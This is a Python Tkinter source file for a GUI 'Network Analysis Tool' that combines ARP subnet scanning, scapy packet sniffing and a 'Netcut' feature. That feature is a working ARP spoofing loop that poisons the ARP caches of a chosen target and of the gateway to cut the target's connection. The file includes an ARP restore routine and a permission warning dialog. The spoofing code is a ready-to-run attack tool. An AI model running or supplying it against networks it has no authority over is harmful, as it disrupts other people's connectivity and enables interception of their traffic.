import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from tkinter import filedialog
import threading
import subprocess
import platform
import time
import sys
import csv

# --- User Attribution ---
APP_AUTHOR = "Dr. Mohammed Tawfik"
APP_EMAIL = "kmkhol01@gmail.com"
APP_TITLE = f"Network Analysis Tool by {APP_AUTHOR}"

# Attempt to import scapy, provide guidance if missing or permissions are wrong
try:
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    from scapy.all import ARP, Ether, srp, send, get_macbyip, conf, sniff # Added sniff
    SCAPY_AVAILABLE = True
    try:
        DEFAULT_GATEWAY = conf.route.route("0.0.0.0")[2]
    except Exception:
        if platform.system() == "Linux":
            try:
                result = subprocess.run(["ip", "route"], capture_output=True, text=True, check=True)
                for line in result.stdout.splitlines():
                    if line.startswith("default via"):
                        DEFAULT_GATEWAY = line.split()[2]
                        break
                else:
                    DEFAULT_GATEWAY = "192.168.1.1"
            except Exception:
                 DEFAULT_GATEWAY = "192.168.1.1"
        else:
             DEFAULT_GATEWAY = "192.168.1.1"
except ImportError:
    SCAPY_AVAILABLE = False
    DEFAULT_GATEWAY = ""
except OSError as e:
    # Specific check for Windows permission error before Npcap might be fully initialized
    if platform.system() == "Windows" and ("The requested operation requires elevation" in str(e) or "failed to open device" in str(e)):
         pass # Defer error until feature use
    elif "Operation not permitted" in str(e) or "Socket operation on non-socket" in str(e):
        pass # Defer error until feature use
    else:
        messagebox.showerror("Scapy Error", f"An error occurred initializing Scapy: {e}\nEnsure it's installed and you have permissions (Npcap on Windows + Run as Admin).")
    SCAPY_AVAILABLE = False
    DEFAULT_GATEWAY = ""
except Exception as e:
    messagebox.showerror("Scapy Init Error", f"Failed to initialize Scapy: {e}")
    SCAPY_AVAILABLE = False
    DEFAULT_GATEWAY = ""

class NetworkToolApp:
    def __init__(self, root):
        self.root = root
        self.root.title(APP_TITLE)
        self.root.geometry("950x700") # Increased size for sniffer

        self.spoofing_active = False
        self.spoof_thread = None
        self.sniffing_active = False # Added for sniffing state
        self.sniff_thread = None    # Added for sniffing thread
        self.discovered_devices = []

        # --- Color Scheme (Red/Blue Dark Theme) ---
        self.bg_color = "#2E3440"      # Dark background (Nord Polar Night)
        self.frame_bg = "#3B4252"      # Slightly lighter dark (Nord Polar Night)
        self.button_bg = "#5E81AC"     # Blue accent (Nord Frost)
        self.button_fg = "#ECEFF4"     # Light text (Nord Snow Storm)
        self.label_fg = "#D8DEE9"     # Lighter gray text (Nord Snow Storm)
        self.entry_bg = "#4C566A"      # Darker entry background (Nord Polar Night)
        self.entry_fg = "#ECEFF4"     # Light entry text
        self.listbox_bg = "#434C5E"    # Dark listbox (Nord Polar Night)
        self.listbox_fg = "#ECEFF4"    # Light listbox text
        self.stop_button_bg = "#BF616A" # Red accent (Nord Frost - Aurora)
        self.header_fg = "#88C0D0"    # Cyan for headers (Nord Frost)

        self.root.configure(bg=self.bg_color)

        # --- Style ---
        style = ttk.Style()
        style.theme_use("clam") # Use a theme that allows more customization

        style.configure("TFrame", background=self.frame_bg)
        style.configure("TLabel", background=self.frame_bg, foreground=self.label_fg, padding=3)
        style.configure("Header.TLabel", foreground=self.header_fg, font=("Helvetica", 12, "bold"))
        style.configure("Output.TLabel", background=self.bg_color, foreground=self.label_fg)
        style.configure("Status.TLabel", background=self.frame_bg, foreground=self.label_fg) # Status bar matches control frame
        style.configure("TEntry", fieldbackground=self.entry_bg, foreground=self.entry_fg, insertcolor=self.entry_fg, borderwidth=1, relief="flat")
        style.map("TEntry", bordercolor=[("focus", self.button_bg)])

        style.configure("TButton", padding=6, relief="flat", background=self.button_bg, foreground=self.button_fg, borderwidth=0)
        style.map("TButton", background=[("active", "#81A1C1")]) # Lighter blue on active

        style.configure("Stop.TButton", background=self.stop_button_bg, foreground=self.button_fg)
        style.map("Stop.TButton", background=[("active", "#D08770")]) # Orangey-red on active

        style.configure("Vertical.TScrollbar", background=self.button_bg, troughcolor=self.frame_bg, bordercolor=self.frame_bg, arrowcolor=self.button_fg)
        style.map("Vertical.TScrollbar", background=[("active", "#81A1C1")])

        style.configure("TNotebook", background=self.bg_color, borderwidth=0)
        style.configure("TNotebook.Tab", background=self.frame_bg, foreground=self.label_fg, padding=[5, 2], borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", self.button_bg), ("active", "#4C566A")], foreground=[("selected", self.button_fg)])

        # --- Main Layout Frames ---
        self.control_frame = ttk.Frame(root, padding=(10, 10))
        self.control_frame.pack(side=tk.LEFT, fill=tk.Y)

        self.output_frame = tk.Frame(root, bg=self.bg_color, padx=10, pady=10)
        self.output_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # --- Control Frame Widgets ---
        ttk.Label(self.control_frame, text="Network Scan", style="Header.TLabel").pack(pady=(0, 5), anchor=tk.W)
        self.scan_target_label = ttk.Label(self.control_frame, text="Scan Target (e.g., 192.168.1.0/24):")
        self.scan_target_label.pack(pady=(5,0), anchor=tk.W)
        self.scan_target_entry = ttk.Entry(self.control_frame, width=25)
        self.scan_target_entry.insert(0, "192.168.1.0/24")
        self.scan_target_entry.pack(pady=5, fill=tk.X)
        self.scan_button = ttk.Button(self.control_frame, text="Scan Network", command=self.start_scan_thread)
        self.scan_button.pack(pady=5, fill=tk.X)

        ttk.Separator(self.control_frame, orient='horizontal').pack(fill='x', pady=15)

        ttk.Label(self.control_frame, text="ARP Spoof (Netcut)", style="Header.TLabel").pack(pady=(0, 5), anchor=tk.W)
        self.gateway_label = ttk.Label(self.control_frame, text="Gateway IP (Auto-detected):")
        self.gateway_label.pack(pady=(5, 0), anchor=tk.W)
        self.gateway_ip_entry = ttk.Entry(self.control_frame, width=25)
        self.gateway_ip_entry.insert(0, DEFAULT_GATEWAY)
        self.gateway_ip_entry.pack(pady=5, fill=tk.X)
        self.netcut_label = ttk.Label(self.control_frame, text="Target IP for Netcut:")
        self.netcut_label.pack(pady=(5, 0), anchor=tk.W)
        self.netcut_ip_entry = ttk.Entry(self.control_frame, width=25)
        self.netcut_ip_entry.pack(pady=5, fill=tk.X)
        self.netcut_button = ttk.Button(self.control_frame, text="Apply Netcut", command=self.toggle_netcut)
        self.netcut_button.pack(pady=5, fill=tk.X)

        ttk.Separator(self.control_frame, orient='horizontal').pack(fill='x', pady=15)

        # --- Sniffing Controls ---
        ttk.Label(self.control_frame, text="Packet Sniffing", style="Header.TLabel").pack(pady=(0, 5), anchor=tk.W)
        self.sniff_filter_label = ttk.Label(self.control_frame, text="Filter (BPF, e.g., 'host 1.1.1.1'):")
        self.sniff_filter_label.pack(pady=(5, 0), anchor=tk.W)
        self.sniff_filter_entry = ttk.Entry(self.control_frame, width=25)
        self.sniff_filter_entry.pack(pady=5, fill=tk.X)
        self.sniff_count_label = ttk.Label(self.control_frame, text="Packet Count (0=infinite):")
        self.sniff_count_label.pack(pady=(5, 0), anchor=tk.W)
        self.sniff_count_entry = ttk.Entry(self.control_frame, width=10)
        self.sniff_count_entry.insert(0, "100") # Default to 100 packets
        self.sniff_count_entry.pack(pady=5, anchor=tk.W)
        self.sniff_button = ttk.Button(self.control_frame, text="Start Sniffing", command=self.toggle_sniffing)
        self.sniff_button.pack(pady=5, fill=tk.X)

        ttk.Separator(self.control_frame, orient='horizontal').pack(fill='x', pady=15)

        ttk.Label(self.control_frame, text="Output Options", style="Header.TLabel").pack(pady=(0, 5), anchor=tk.W)
        self.export_button = ttk.Button(self.control_frame, text="Export Device List", command=self.export_list)
        self.export_button.pack(pady=5, fill=tk.X)
        self.clear_button = ttk.Button(self.control_frame, text="Clear Output", command=self.clear_output)
        self.clear_button.pack(pady=5, fill=tk.X)

        # --- Output Frame Widgets ---
        self.notebook = ttk.Notebook(self.output_frame, style="TNotebook")

        # Scan Output Tab
        self.scan_tab = ttk.Frame(self.notebook, style="TFrame")
        self.notebook.add(self.scan_tab, text='Scan Results')
        self.output_label = ttk.Label(self.scan_tab, text="Discovered Devices:", style="Output.TLabel", background=self.bg_color)
        self.output_label.pack(anchor=tk.W, padx=5, pady=(5,0))
        self.listbox_frame = tk.Frame(self.scan_tab, bg=self.bg_color)
        self.listbox_scrollbar = ttk.Scrollbar(self.listbox_frame, orient=tk.VERTICAL, style="Vertical.TScrollbar")
        self.device_listbox = tk.Listbox(self.listbox_frame, bg=self.listbox_bg, fg=self.listbox_fg, height=20, width=70,
                                         yscrollcommand=self.listbox_scrollbar.set, relief="flat", borderwidth=0, highlightthickness=0,
                                         selectbackground=self.button_bg, selectforeground=self.button_fg)
        self.listbox_scrollbar.config(command=self.device_listbox.yview)
        self.listbox_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.device_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.listbox_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Sniffer Output Tab
        self.sniff_tab = ttk.Frame(self.notebook, style="TFrame")
        self.notebook.add(self.sniff_tab, text='Sniffer Output')
        self.sniff_output_label = ttk.Label(self.sniff_tab, text="Captured Packets:", style="Output.TLabel", background=self.bg_color)
        self.sniff_output_label.pack(anchor=tk.W, padx=5, pady=(5,0))
        self.sniff_listbox_frame = tk.Frame(self.sniff_tab, bg=self.bg_color)
        self.sniff_listbox_scrollbar = ttk.Scrollbar(self.sniff_listbox_frame, orient=tk.VERTICAL, style="Vertical.TScrollbar")
        self.sniff_listbox = tk.Listbox(self.sniff_listbox_frame, bg=self.listbox_bg, fg=self.listbox_fg, height=20, width=90,
                                          yscrollcommand=self.sniff_listbox_scrollbar.set, relief="flat", borderwidth=0, highlightthickness=0,
                                          selectbackground=self.button_bg, selectforeground=self.button_fg)
        self.sniff_listbox_scrollbar.config(command=self.sniff_listbox.yview)
        self.sniff_listbox_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.sniff_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.sniff_listbox_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.notebook.pack(fill=tk.BOTH, expand=True, pady=(5,0))

        # Status Bar
        self.status_bar = ttk.Frame(root, style="TFrame", relief="sunken", padding=(2,2))
        self.status_label = ttk.Label(self.status_bar, text="Status: Idle", style="Status.TLabel")
        self.status_label.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.author_label = ttk.Label(self.status_bar, text=f"{APP_EMAIL}", style="Status.TLabel")
        self.author_label.pack(side=tk.RIGHT, padx=5)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Initial Checks
        if not SCAPY_AVAILABLE:
            self.update_status("Scapy not found or permission error. Features disabled.")
            self.scan_button.config(state=tk.DISABLED)
            self.netcut_button.config(state=tk.DISABLED)
            self.sniff_button.config(state=tk.DISABLED)
            self.export_button.config(state=tk.DISABLED)
            messagebox.showwarning("Scapy Missing/Error", "Python library 'scapy' is required and needs root/admin privileges.\nPlease install it ('pip install scapy') and ensure Npcap is installed on Windows.\nRun this tool using 'sudo' or as Administrator.")
        else:
            if platform.system() == "Windows":
                 self.update_status("Ready (Run as Admin recommended on Windows)")
                 try:
                     conf.ifaces.reload()
                     if not conf.ifaces:
                         messagebox.showwarning("Npcap?", "Scapy loaded, but no network interfaces found. Ensure Npcap is installed correctly on Windows.")
                 except Exception as e:
                     print(f"Interface check failed: {e}")
            elif subprocess.getoutput("id -u") != '0':
                 self.update_status("Ready (Root privileges recommended)")
                 messagebox.showwarning("Permissions", "Root privileges ('sudo') are recommended for full functionality.")
            else:
                 self.update_status("Ready")

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def update_status(self, text):
        self.root.after(0, self.status_label.config, {"text": f"Status: {text}"})

    # --- Scan Functions ---
    def start_scan_thread(self):
        if not self._check_scapy_and_perms("scan"):
            return
        scan_thread = threading.Thread(target=self.scan_network, daemon=True)
        scan_thread.start()

    def scan_network(self):
        self.scan_button.config(state=tk.DISABLED)
        self.export_button.config(state=tk.DISABLED)
        self.update_status("Scanning...")
        self.root.after(0, self.device_listbox.delete, 0, tk.END)
        self.discovered_devices = []
        self.root.update_idletasks()

        target_ip_range = self.scan_target_entry.get()
        if not target_ip_range:
            messagebox.showwarning("Input Error", "Please enter a target network range (e.g., 192.168.1.0/24).")
            self.update_status("Scan failed - No target.")
            self.scan_button.config(state=tk.NORMAL)
            return

        try:
            arp = ARP(pdst=target_ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=3, verbose=0)[0]

            for sent, received in result:
                device_info = {"ip": received.psrc, "mac": received.hwsrc}
                self.discovered_devices.append(device_info)
                # Ensure GUI update is thread-safe
                self.root.after(0, self.device_listbox.insert, tk.END, f"IP: {device_info['ip']} \t MAC: {device_info['mac']}")

            if self.discovered_devices:
                self.update_status(f"Scan complete. Found {len(self.discovered_devices)} devices.")
                self.export_button.config(state=tk.NORMAL)
            else:
                self.update_status("Scan complete. No devices found.")

        except PermissionError:
             messagebox.showerror("Permission Error", "Scanning requires root privileges (run with 'sudo' or as Admin).")
             self.update_status("Scan failed - Permissions.")
        except Exception as e:
            messagebox.showerror("Scan Error", f"An error occurred during scanning: {e}")
            self.update_status(f"Scan failed - {e}")
        finally:
            self.scan_button.config(state=tk.NORMAL)
            if not self.discovered_devices:
                 self.export_button.config(state=tk.DISABLED)
            self.root.update_idletasks()

    # --- Permission Check ---
    def _check_scapy_and_perms(self, feature_name="feature"):
        if not SCAPY_AVAILABLE:
             messagebox.showerror("Error", f"Scapy is not available. Cannot use {feature_name}.")
             return False
        if platform.system() != "Windows":
            try:
                if subprocess.getoutput("id -u") != '0':
                    messagebox.showerror("Permission Error", f"{feature_name.capitalize()} requires root privileges. Please run with 'sudo'.")
                    return False
            except Exception as e:
                 messagebox.showerror("Permission Check Error", f"Could not verify user privileges: {e}")
                 return False
        # On Windows, check if Npcap seems loaded (basic check)
        elif platform.system() == "Windows":
             try:
                 conf.ifaces.reload()
                 if not conf.ifaces:
                      messagebox.showwarning("Npcap?", "Scapy loaded, but no network interfaces found. Ensure Npcap is installed correctly and try running as Administrator.")
                      # We don't return False here, as Scapy might work for some things anyway
             except Exception:
                 pass # Ignore interface check errors for now
        return True

    # --- ARP Spoof (Netcut) Functions ---
    def toggle_netcut(self):
        if self.spoofing_active:
            self.stop_netcut()
        else:
            self.start_netcut()

    def start_netcut(self):
        if not self._check_scapy_and_perms("netcut"):
            return

        target_ip = self.netcut_ip_entry.get()
        gateway_ip = self.gateway_ip_entry.get()

        if not target_ip or not gateway_ip:
            messagebox.showwarning("Input Error", "Please enter both Target IP and Gateway IP.")
            return
        if target_ip == gateway_ip:
            messagebox.showwarning("Input Error", "Target IP and Gateway IP cannot be the same.")
            return

        confirm = messagebox.askyesno("Confirm Netcut", f"WARNING: Applying netcut (ARP Spoofing) between {target_ip} and gateway {gateway_ip} will disrupt network connectivity. This should ONLY be done on networks you own or have explicit permission to test. Misuse can lead to network instability. Proceed?")
        if not confirm:
            self.update_status("Netcut cancelled.")
            return

        self.spoofing_active = True
        self.netcut_button.config(text="Stop Netcut", style="Stop.TButton")
        self.update_status(f"Starting ARP spoof for {target_ip}...")
        self.spoof_thread = threading.Thread(target=self._arp_spoof_loop, args=(target_ip, gateway_ip), daemon=True)
        self.spoof_thread.start()

    def stop_netcut(self, restore=True):
        if not self.spoofing_active:
            return

        self.spoofing_active = False
        self.update_status("Stopping ARP spoof...")

        if restore:
            restore_thread = threading.Thread(target=self._restore_arp, args=(self.netcut_ip_entry.get(), self.gateway_ip_entry.get()), daemon=True)
            restore_thread.start()
        else:
             self.update_status("Stopped spoof without ARP restore.")

        self.netcut_button.config(text="Apply Netcut", style="TButton")

    def _restore_arp(self, target_ip, gateway_ip):
        # Give the main loop a chance to stop sending
        time.sleep(0.1)
        try:
            target_mac = get_macbyip(target_ip)
            gateway_mac = get_macbyip(gateway_ip)
            if target_mac and gateway_mac:
                send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5, verbose=0)
                send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
                self.update_status(f"ARP tables restored for {target_ip} & {gateway_ip}.")
            else:
                 self.update_status("Stopped spoof. Could not get MACs to restore ARP.")
        except Exception as e:
            self.update_status(f"Stopped spoof. Error restoring ARP: {e}")

    def _arp_spoof_loop(self, target_ip, gateway_ip):
        try:
            target_mac = get_macbyip(target_ip)
            gateway_mac = get_macbyip(gateway_ip)
            if not target_mac:
                messagebox.showerror("Error", f"Could not resolve MAC address for target IP: {target_ip}. Stopping spoof.")
                self.root.after(0, self.stop_netcut, False)
                return
            if not gateway_mac:
                messagebox.showerror("Error", f"Could not resolve MAC address for gateway IP: {gateway_ip}. Stopping spoof.")
                self.root.after(0, self.stop_netcut, False)
                return

            self.update_status(f"Actively spoofing {target_ip} <-> {gateway_ip}")
            while self.spoofing_active:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                # Check if still active before sleeping
                if not self.spoofing_active:
                    break
                time.sleep(2)

        except PermissionError:
            messagebox.showerror("Permission Error", "ARP Spoofing requires root privileges. Stopping.")
            self.root.after(0, self.stop_netcut, False)
        except Exception as e:
            messagebox.showerror("Spoofing Error", f"An error occurred during ARP spoofing: {e}")
            self.root.after(0, self.stop_netcut, False)
        finally:
            # Ensure button state is reset if thread exits unexpectedly
            if self.spoofing_active:
                 self.root.after(0, self.stop_netcut, False)

    # --- Sniffing Functions ---
    def toggle_sniffing(self):
        if self.sniffing_active:
            self.stop_sniffing()
        else:
            self.start_sniffing()

    def start_sniffing(self):
        if not self._check_scapy_and_perms("sniffing"):
            return

        self.sniffing_active = True
        self.sniff_button.config(text="Stop Sniffing", style="Stop.TButton")
        self.update_status("Starting packet sniffing...")
        self.root.after(0, self.sniff_listbox.delete, 0, tk.END)

        bpf_filter = self.sniff_filter_entry.get()
        try:
            packet_count = int(self.sniff_count_entry.get())
        except ValueError:
            messagebox.showerror("Input Error", "Packet count must be an integer.")
            self.root.after(0, self.stop_sniffing) # Use root.after to ensure GUI update
            return

        self.sniff_thread = threading.Thread(target=self._sniff_loop, args=(bpf_filter, packet_count), daemon=True)
        self.sniff_thread.start()

    def stop_sniffing(self):
        if not self.sniffing_active:
            return
        self.sniffing_active = False
        self.update_status("Stopping packet sniffing...")
        self.sniff_button.config(text="Start Sniffing", style="TButton")
        # Scapy's sniff will stop because stop_filter or prn check self.sniffing_active

    def _packet_handler(self, packet):
        # Called by scapy for each captured packet
        if not self.sniffing_active:
            return True # Tell scapy's sniff to stop
        try:
            summary = packet.summary()
            # Use root.after to safely update GUI from this thread
            self.root.after(0, self._add_sniff_item, summary)
        except Exception as e:
            print(f"Error processing packet summary: {e}") # Log error
        return False # Tell scapy's sniff to continue

    def _add_sniff_item(self, summary):
        # Helper function to add item and scroll, ensuring it runs in main thread
        self.sniff_listbox.insert(tk.END, summary)
        self.sniff_listbox.yview_moveto(1.0)

    def _sniff_loop(self, bpf_filter, packet_count):
        try:
            filter_text = f"Filter: '{bpf_filter}'" if bpf_filter else "Filter: None"
            count_text = f"Count: {packet_count if packet_count > 0 else 'Infinite'}"
            self.update_status(f"Sniffing started ({filter_text}, {count_text})...")

            # Use stop_filter for cleaner stopping
            sniff(filter=bpf_filter, prn=self._packet_handler, count=packet_count, store=False,
                  stop_filter=lambda p: not self.sniffing_active)

            # Check if stopped by user or count reached
            if self.sniffing_active: # If count reached
                 self.update_status("Sniffing finished (packet count reached).")
                 self.root.after(0, self.stop_sniffing) # Update button state
            else: # Stopped by user via button
                 self.update_status("Sniffing stopped by user.")

        except PermissionError:
            messagebox.showerror("Permission Error", "Sniffing requires root privileges (run with 'sudo' or as Admin).")
            self.root.after(0, self.stop_sniffing)
            self.update_status("Sniffing failed - Permissions.")
        except Exception as e:
            if "syntax error" in str(e).lower() and bpf_filter:
                 messagebox.showerror("Filter Error", f"Invalid BPF filter syntax: {bpf_filter}\n{e}")
                 self.update_status("Sniffing failed - Invalid filter.")
            else:
                 messagebox.showerror("Sniffing Error", f"An error occurred during sniffing: {e}")
                 self.update_status(f"Sniffing failed - {e}")
            self.root.after(0, self.stop_sniffing)
        finally:
            # Ensure button is reset if thread stops unexpectedly
            if self.sniffing_active:
                self.root.after(0, self.stop_sniffing)

    # --- Output Functions ---
    def export_list(self):
        if not self.discovered_devices:
            messagebox.showinfo("Export", "No devices to export. Please scan the network first.")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV files", "*.csv"), ("Text files", "*.txt"), ("All files", "*.*")],
            title="Save Device List As"
        )
        if not file_path:
            self.update_status("Export cancelled.")
            return

        try:
            with open(file_path, 'w', newline='') as f:
                if file_path.lower().endswith('.csv'):
                    writer = csv.writer(f)
                    writer.writerow(["IP Address", "MAC Address"])
                    for device in self.discovered_devices:
                        writer.writerow([device['ip'], device['mac']])
                else:
                    f.write("Discovered Devices:\n")
                    f.write("--------------------\n")
                    for device in self.discovered_devices:
                        f.write(f"IP: {device['ip']}\tMAC: {device['mac']}\n")
            self.update_status(f"Device list exported to {file_path}")
            messagebox.showinfo("Export Successful", f"Device list saved to\n{file_path}")
        except Exception as e:
            self.update_status(f"Export failed: {e}")
            messagebox.showerror("Export Error", f"Failed to save file: {e}")

    def clear_output(self):
        self.device_listbox.delete(0, tk.END)
        self.sniff_listbox.delete(0, tk.END)
        self.discovered_devices = []
        self.export_button.config(state=tk.DISABLED)
        self.update_status("Output cleared.")

    # --- Closing Function ---
    def on_closing(self):
        # Stop active processes gracefully
        if self.spoofing_active:
            if messagebox.askyesno("Spoofing Active", "ARP spoofing is active. Attempt to restore ARP tables before closing?", default=messagebox.YES):
                 self.stop_netcut(restore=True)
                 time.sleep(0.5) # Give restore thread a moment
            else:
                 self.stop_netcut(restore=False)
        if self.sniffing_active:
            self.stop_sniffing()

        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    try:
        root.winfo_screenwidth() # Check display availability
    except tk.TclError as e:
        if "no display name" in str(e) or "couldn't connect to display" in str(e):
             print("ERROR: No display environment available (e.g., running in SSH without X forwarding?). Cannot run Tkinter GUI.", file=sys.stderr)
             sys.exit(1)
        else:
             raise e

    app = NetworkToolApp(root)
    root.mainloop()

